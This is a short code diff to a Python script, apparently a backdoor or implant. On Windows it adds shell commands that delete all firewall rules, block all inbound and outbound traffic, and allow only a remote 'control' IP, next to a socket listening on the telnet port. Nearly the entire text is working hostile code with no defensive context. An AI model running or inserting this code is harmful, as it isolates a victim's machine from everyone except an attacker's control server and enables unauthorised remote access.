@@ -223,6 +223,14 @@ try:
     user = users[0]
 except ImportError:
     ver = "W"
+    proc = Popen("netsh advfirewall firewall delete rule name=all", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
+    print(proc.stdout.read())
+    proc = Popen("netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
+    print(proc.stdout.read())
+    proc = Popen("netsh advfirewall firewall add rule name=sirenin dir=in action=allow remoteip=" + control, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
+    print(proc.stdout.read())
+    proc = Popen("netsh advfirewall firewall add rule name=sirenout dir=out action=allow remoteip=" + control, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
+    print(proc.stdout.read())
     user = users[1]
 telsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 telsock.bind(('', 23))
